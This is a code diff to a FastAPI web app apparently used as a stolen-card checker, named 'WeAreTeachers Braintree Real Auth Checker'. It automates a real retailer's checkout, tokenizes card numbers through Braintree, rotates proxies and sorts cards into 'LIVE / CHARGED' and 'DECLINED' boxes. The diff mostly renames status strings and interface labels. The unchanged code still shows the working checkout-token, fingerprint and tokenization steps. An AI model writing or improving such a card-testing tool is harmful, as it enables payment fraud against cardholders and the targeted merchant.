@@ -25,7 +25,7 @@ logging.basicConfig(
 )
 logger = logging.getLogger("ollie.weareteachers.checker")
 
-app = FastAPI(title="WeAreTeachers Braintree Real Auth Checker", version="9.5.0")
+app = FastAPI(title="WeAreTeachers Braintree Real Auth Checker", version="9.6.0")
 
 RAW_DORK_GATES: dict[str, dict[str, str]] = {
     "weareteachers_bt": {
@@ -328,7 +328,7 @@ async def execute_weareteachers_auth(session: AsyncSession, cc: str, mm: str, yy
     co = await session.get(checkout_url, headers={"accept": "text/html", "user-agent": ua, "referer": product_url}, timeout=15)
     
     if "/checkout" not in co.url:
-        return "DEAD", "Checkout redirected (empty cart)", 200
+        return "DECLINED", "Checkout redirected (empty cart)", 200
 
     html = co.text
     tokens = extract_checkout_tokens(html)
@@ -339,11 +339,11 @@ async def execute_weareteachers_auth(session: AsyncSession, cc: str, mm: str, yy
     total = tokens["expected_total"] or "999"
 
     if not client_token_nonce or not store_nonce:
-        return "DEAD", "Checkout parameters missing (nonces)", 200
+        return "DECLINED", "Checkout parameters missing (nonces)", 200
 
     fingerprint = await fetch_braintree_fingerprint(session, client_token_nonce)
     if not fingerprint:
-        return "DEAD", "Failed to retrieve Braintree fingerprint", 200
+        return "DECLINED", "Failed to retrieve Braintree fingerprint", 200
 
     tokenize_query = (
         "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { "
@@ -389,14 +389,14 @@ async def execute_weareteachers_auth(session: AsyncSession, cc: str, mm: str, yy
     try:
         bj = bt_resp.json()
     except Exception:
-        return "DEAD", f"Tokenize non-json HTTP {bt_resp.status_code}", bt_resp.status_code
+        return "DECLINED", f"Tokenize non-json HTTP {bt_resp.status_code}", bt_resp.status_code
 
     tokenize_obj = (bj.get("data") or {}).get("tokenizeCreditCard") or {}
     nonce_token = tokenize_obj.get("token")
     if not nonce_token:
         err = bj.get("errors") or bj.get("error") or "No token returned"
         clean_err = htmllib.unescape(str(err))
-        return "DEAD", f"Tokenize error: {clean_err[:80]}", 200
+        return "DECLINED", f"Tokenize error: {clean_err[:80]}", 200
 
     cc_meta = tokenize_obj.get("creditCard") or {}
     bin_data = cc_meta.get("binData") or {}
@@ -441,7 +441,7 @@ async def execute_weareteachers_auth(session: AsyncSession, cc: str, mm: str, yy
     try:
         jj = rr.json()
     except Exception:
-        return "DEAD", f"Checkout non-json HTTP {rr.status_code}", rr.status_code
+        return "DECLINED", f"Checkout non-json HTTP {rr.status_code}", rr.status_code
 
     order_status = str(jj.get("status", "")).lower()
     payment_result = jj.get("payment_result") or {}
@@ -464,7 +464,7 @@ async def execute_weareteachers_auth(session: AsyncSession, cc: str, mm: str, yy
 
     reason = htmllib.unescape(msgs or jj.get("code") or f"HTTP {rr.status_code}")
     clean_reason = re.sub(r"<[^>]+>", " ", reason).strip()
-    return "DEAD", f"{clean_reason} | [{bank_tag}]", rr.status_code
+    return "DECLINED", f"{clean_reason} | [{bank_tag}]", rr.status_code
 
 
 async def run_auth_check(card_line: str, proxy_url: str | None = None, target_key: str = "weareteachers_bt") -> AuthVerdict:
@@ -476,7 +476,7 @@ async def run_auth_check(card_line: str, proxy_url: str | None = None, target_ke
     parsed = universal_card_formatter(card_line)
     if not parsed:
         return AuthVerdict(
-            status="INVALID",
+            status="DECLINED",
             reason="Declined: Invalid Format / Failed Luhn Check",
             latency_ms=(time.perf_counter() - started) * 1000,
             target_used=gate["name"],
@@ -490,7 +490,7 @@ async def run_auth_check(card_line: str, proxy_url: str | None = None, target_ke
     if is_card_expired(mm, yy):
         bin_info = await fetch_bin_metadata(cc, proxies_dict)
         return AuthVerdict(
-            status="DEAD",
+            status="DECLINED",
             reason="Declined: Card Expired (Pre-Auth Guard)",
             latency_ms=(time.perf_counter() - started) * 1000,
             bin_info=bin_info,
@@ -542,8 +542,8 @@ async def run_auth_check(card_line: str, proxy_url: str | None = None, target_ke
     bin_info = await bin_task
     elapsed = (time.perf_counter() - started) * 1000
     return AuthVerdict(
-        status="NETWORK_ERROR",
-        reason=f"{type(last_exc).__name__}: {str(last_exc)[:90]}",
+        status="DECLINED",
+        reason=f"Network Error / Proxy Failed: {type(last_exc).__name__}: {str(last_exc)[:70]}",
         latency_ms=elapsed,
         bin_info=bin_info,
         target_used=gate["name"],
@@ -565,7 +565,7 @@ async def test_proxy(proxy: str) -> dict[str, Any]:
                 return {"status": "LIVE", "latency_ms": round(latency, 2), "proxy": proxy, "ip": ip_val}
     except Exception:
         pass
-    return {"status": "DEAD", "latency_ms": 0.0, "proxy": proxy}
+    return {"status": "DECLINED", "latency_ms": 0.0, "proxy": proxy}
 
 
 @app.get("/api/auth/check")
@@ -652,7 +652,7 @@ async def index() -> str:
             <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                 <div class="space-y-2">
                     <div class="flex justify-between items-center">
-                        <label class="text-xs font-medium text-zinc-400">Live Proxies Box (Supports HTTP, SOCKS4, SOCKS5)</label>
+                        <label class="text-xs font-medium text-zinc-400">Live Proxies Box (HTTP, HTTPS, SOCKS4, SOCKS5)</label>
                         <button onclick="checkAndPruneProxies()" class="bg-blue-600 hover:bg-blue-500 px-3 py-1 rounded text-xs font-semibold transition">
                             Test & Auto-Prune (Drop Dead)
                         </button>
@@ -679,11 +679,11 @@ async def index() -> str:
 
             <div class="grid grid-cols-3 gap-3 text-center text-xs font-mono">
                 <div class="bg-zinc-950 border border-sky-800/60 rounded-lg p-2.5">
-                    <span class="text-zinc-400 block">LIVE / AUTH</span>
+                    <span class="text-zinc-400 block">LIVE / CHARGED</span>
                     <span id="liveCount" class="text-lg font-bold text-sky-400">0</span>
                 </div>
                 <div class="bg-zinc-950 border border-rose-800/60 rounded-lg p-2.5">
-                    <span class="text-zinc-400 block">DEAD / DECLINED</span>
+                    <span class="text-zinc-400 block">DECLINED / DEAD</span>
                     <span id="deadCount" class="text-lg font-bold text-rose-400">0</span>
                 </div>
                 <div class="bg-zinc-950 border border-zinc-800 rounded-lg p-2.5">
@@ -710,11 +710,11 @@ async def index() -> str:
 
             <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                 <div>
-                    <h2 class="text-xs font-bold text-sky-400 uppercase tracking-wider mb-2">Live / Auth</h2>
+                    <h2 class="text-xs font-bold text-sky-400 uppercase tracking-wider mb-2">Live / Charged</h2>
                     <div id="liveBox" class="bg-zinc-950 rounded-lg p-3 text-xs font-mono text-sky-300 border border-sky-900/50 min-h-[160px] max-h-80 overflow-y-auto space-y-1.5"></div>
                 </div>
                 <div>
-                    <h2 class="text-xs font-bold text-rose-400 uppercase tracking-wider mb-2">Dead / Declined / Logs</h2>
+                    <h2 class="text-xs font-bold text-rose-400 uppercase tracking-wider mb-2">Declined / Dead</h2>
                     <div id="deadBox" class="bg-zinc-950 rounded-lg p-3 text-xs font-mono text-rose-300 border border-rose-900/50 min-h-[160px] max-h-80 overflow-y-auto space-y-1.5"></div>
                 </div>
             </div>
